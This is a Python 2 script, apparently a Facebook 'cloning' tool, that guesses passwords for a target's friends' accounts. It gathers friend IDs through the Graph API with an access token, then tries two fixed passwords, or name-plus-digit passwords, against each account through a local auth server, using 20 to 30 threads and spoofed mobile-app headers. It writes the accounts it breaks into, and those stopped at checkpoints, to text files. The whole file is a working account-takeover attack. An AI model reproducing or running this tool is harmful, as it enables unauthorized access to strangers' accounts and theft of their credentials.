#!/usr/bin/python
# coding=utf-8
# Originally Written By:JAM SHAHRUKH
# Source : Python2"
# Donot Recode It. 

#Import module
try:
    import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,cookielib,getpass,mechanize,requests
    from multiprocessing.pool import ThreadPool
    from requests.exceptions import ConnectionError
    from mechanize import Browser
except ImportError:
    os.system('pip2 install requests')
    os.system('pip2 install mechanize')
    os.system('termux-setup-storage -y')
    os.system('apt update && apt install nodejs -y')
    os.system('apt install ruby -y')
    os.system('python2 .choice.py')

#Browser Setting
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
cj = cookielib.LWPCookieJar()
br.set_handle_robots(False)
br.set_handle_redirect(True)
br.set_cookiejar(cj)
br.set_handle_equiv(True)
br.set_handle_referer(True)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
bd = random.randint(2e+07, 3e+07)
sim = random.randint(20000, 40000)
br.addheader = {
    'x-fb-connection-bandwidth': repr(bd),
    'x-fb-sim-hni': repr(sim),
    'x-fb-net-hni': repr(sim),
    'x-fb-connection-quality': 'EXCELLENT',
    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
    'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]',
    'content-type': 'application/x-www-form-urlencoded',
    'x-fb-http-engine': 'Liger' } 
	 
def exit():
	print "[!] Exit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jam(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

		
##### LOGO #####
banner = """
\033[1;91m  ██████████  \033[1;96m██████████  \033[1;93m█████████  \033[1;92m ▀
\033[1;91m  ███    ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ 
\033[1;91m  ███         \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ 
\033[1;91m  ██████████  \033[1;96m██████████  \033[1;93m███   ███  \033[1;92m███ 
\033[1;91m         ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███  
\033[1;91m  ███    ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███  
\033[1;91m  ██████████  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ \x1b[1;90mQUEEN
\033[1;94m══════════════════════════════════════════════
\033[1;90m➣ Author : \033[1;97mSTYLISH QUEEN
\033[1;90m➣ Github : \033[1;97mhttps://github.com/stylish-queen
\033[1;90m➣ Fb Page: \033[1;97mJam Shahrukh Official
\033[1;94m══════════════════════════════════════════════ """
back = 0
threads = []
successful = []
checkpoint = []
oks = []
cps = []
gagal = []
idh = []
id = []
emfromfriend = []
nofromfriend = []
def menu2():
	os.system('clear')
	
	os.system('cd ..... && npm install')
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('cd ..... && node index.js &')
	time.sleep(5)
	os.system('clear')
	
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"[!] Token Not Found"
		os.system('rm -rf login.txt')
		os.system('python2 jam.py')
		time.sleep(1)
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		name = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"[!] Account Is On Checkpoint"
		os.system('rm -rf login.txt')
		os.system('python2 jam.py')
		time.sleep(1)
	except requests.exceptions.ConnectionError:
		print"[!] No Connection"
		time.sleep(1)
		exit()
	os.system("clear")
	print banner
	print "|[✓] Name: "+name
	print "|[✓] ID  : "+id
	print "-"+46*"-"
	print "[1] Clone With 2 Numer Passwords."
	print "[2] Clone With 2 Name Passwords."
	print "[0] Back To Main Menu."
	print "                      "
	menu2_menu()
	
def menu2_menu():
    m2m = raw_input('\nChoose Option >> ')
    if m2m =="":
        print "[!] Filled Incorrectly."
        time.sleep(1)
        menu2_menu()
    elif m2m =="1":
        choice1()
    elif m2m =="2":
        choice2()
    elif m2m =="0":
        os.system('clear')
        jam('Please Wait.')
        jam('While Is Returning To Main Menu.')
        time.sleep(1)
        os.system('python2 sani.py')
    else:
        print "[!] Wrong Input."
        menu2_menu()
        
        
def choice1():
	global toket
	os.system("clear")
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print("[!] Token invalid")
		os.system("rm -rf login.txt")
		time.sleep(1)
		os.system("python2 jam.py")
	os.system("clear")
	print banner
	print ("[1] Crack From Any Public ID.")
	print ("[2] Crack From File.")
	print ("[0] Back")
	print ("        ")
	choice1_menu()

def choice1_menu():
	c1m = raw_input("\nChoose Option >> ")
	if c1m =="":
		print ("[!] Fill in correctly")
		choice_menu()
	elif c1m =="1":
		os.system("clear")
		print (banner)
		idt = raw_input("[✓] Enter ID : ")
		pass1=raw_input("[1] Input Password  : ")
		pass2=raw_input("[2] Input Password  : ")
		print(47*"-")
		print (banner)
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			jam("[✓] Account  Name: "+op["name"])
			
			time.sleep(0.5)
		except KeyError:
			print("[!] ID Not Found!")
			raw_input("\nPress Enter To Back ")
			choice1()
		print"\033[1;35;40m[✺] Getting IDs..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif c1m =="2":
		os.system("clear")
		print (banner)
		try:
			idlist = raw_input("[✓] Enter File Path  : ")
			pass1=raw_input("[1] Input Password  : ")
			pass2=raw_input("[2] Input Password  : ")
			print(47*"-")
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\nPress Enter To Back ")
			choice1()
	elif c1m =="0":
		menu2()
	else:
		print ("[!] Fill in correctly")
		choice1_menu()
	rana = str(len(id))
	jam ("[✓] Total Friends: "+rana)
	time.sleep(0.5)
	jam ("[✓] The Process Has Been Started.")
	time.sleep(0.5)
	jam ("[!] Press CTRL Z To Stop Process")
	time.sleep(0.5)
	print (47*"-")
	
			
	def main(arg):
		global cpb,oks
		user = arg
		(uid, name) = user.split('|')
		try:
		    os.mkdir('save')
		except OSError:
		    pass
		try:
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = br.addheader).text
		    q = json.loads(data)
		    if "loc" in q:
			print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass1
			ok = open('/sdcard/ids/jam_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass1 + '\n')
                        ok.close()
                        oks.append(uid + pass1)
		    elif 'www.facebook.com' in q['error']:
			print '\033[1;93m[JAM-CP] ' + uid + ' | ' + pass1
			cp = open('jam_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass1 + '\n')
                        cp.close()
                        cps.append(uid + pass1)
		    else:
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = br.addheader).text
			q = json.loads(data)
		        if "loc" in q:
			    print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass2
			    ok = open('/sdcard/ids/jam_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass2 + '\n')
                            ok.close()
                            oks.append(uid + pass2)
		        elif 'www.facebook.com' in q['error']:
			    print '\033[1;93m[JAM-CP] ' + uid + ' | ' + pass2
			    cp = open('jam_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass2 + '\n')
                            cp.close()
                            cps.append(uid + pass2)
			
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;97m----------------------------------------------"
	jam('[✓] Process Has Been Completed.')
	jam('\033[1;97m[✓] Checkpoint IDS Has Been Saved.')
	xx = str(len(oks))
	xxx = str(len(cps))
	print ("[✓] Total \033[1;32mOK/\033[1;97mCP : \033[1;32m"+str(len(oks))+"/\033[1;97m"+str(len(cps)))
	print (47*"-")
	raw_input("\nPress Enter To Back ")
	choice1()

def choice2():
	global toket
	os.system("clear")
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print("[!] Token invalid")
		os.system("rm -rf login.txt")
		time.sleep(1)
		os.system("python2 jam.py")
	os.system("clear")
	print banner
	print ("[1] Crack From Any Public ID.")
	print ("[2] Crack From File.")
	print ("[0] Back")
	print ("        ")
	choice2_menu()

def choice2_menu():
	c2m = raw_input("\nChoose Option >> ")
	if c2m =="":
		print ("[!] Fill in correctly")
		choice_menu()
	elif c2m =="1":
		os.system("clear")
		print (banner)
		idt = raw_input("[✓] Enter ID : ")
		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
                p2 = raw_input(' \033[1;92m[2]Name + digit: ')
		print (47*"-")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			jam("[✓] Account  Name: "+op["name"])
			time.sleep(0.5)
		except KeyError:
			print("[!] ID Not Found!")
			raw_input("\nPress Enter To Back ")
			choice2()
		print"\033[1;35;40m[✺] Getting IDs..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif c2m =="2":
		os.system("clear")
		print (banner)
		try:
			idlist = raw_input("[✓] Enter File Path : ")
			p1 = raw_input(' \033[1;92m[1]Name + digit: ')
                        p2 = raw_input(' \033[1;92m[2]Name + digit: ')
			print(47*"-")
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\nPress Enter To Back ")
			choice2()
	elif c2m =="0":
		menu2()
	else:
		print ("[!] Fill in correctly")
		choice2_menu()
	rana = str(len(id))
	jam ("[✓] Total Friends: "+rana)
	time.sleep(0.5)
	jam ("[✓] The Process Has Been Started.")
	time.sleep(0.5)
	jam ("[!] Press CTRL Z To Stop Process.")
	time.sleep(0.5)
	print (47*"-")
	
			
	def main(arg):
		global cpb,oks
		user = arg
		(uid, name) = user.split('|')
		try:
		    os.mkdir('save')
		except OSError:
		    pass
		try:
		    pass1 = name.lower() + p1
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = br.addheader).text
		    q = json.loads(data)
		    if "loc" in q:
			print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass1
			ok = open('/sdcard/ids/jam_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass1 + '\n')
                        ok.close()
                        oks.append(uid + pass1)
		    elif 'www.facebook.com' in q['error']:
			print '\033[1;93m[JAM-CP] ' + uid + ' | ' + pass1
			cp = open('jam_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass1 + '\n')
                        cp.close()
                        cps.append(uid + pass1)
		    else:
			pass2 = name.lower() + p2
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = br.addheader).text
			q = json.loads(data)
		        if "loc" in q:
			    print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass2
			    ok = open('/sdcard/ids/jam_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass2 + '\n')
                            ok.close()
                            oks.append(uid + pass2)
		        elif 'www.facebook.com' in q['error']:
			    print '\033[1;93m[JAM-CP] ' + uid + ' | ' + pass2
			    cp = open('jam_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass2 + '\n')
                            cp.close()
                            cps.append(uid + pass2)

										
																	
															
		except:
			pass
		
	p = ThreadPool(20)
	p.map(main, id)
	print "\033[1;97m----------------------------------------------"
	jam('[✓] Process Has Been Completed.')
	jam('\033[1;97m[✓] Checkpoint IDS Has Been Saved.')
	xx = str(len(oks))
	xxx = str(len(cps))
	print ("[✓] Total \033[1;32mOK/\033[1;97mCP : \033[1;32m"+str(len(oks))+"/\033[1;97m"+str(len(cps)))
	print (47*"-")
	raw_input("\nPress Enter To Back ")
	choice2()
	
if __name__ == '__main__':
	menu2()
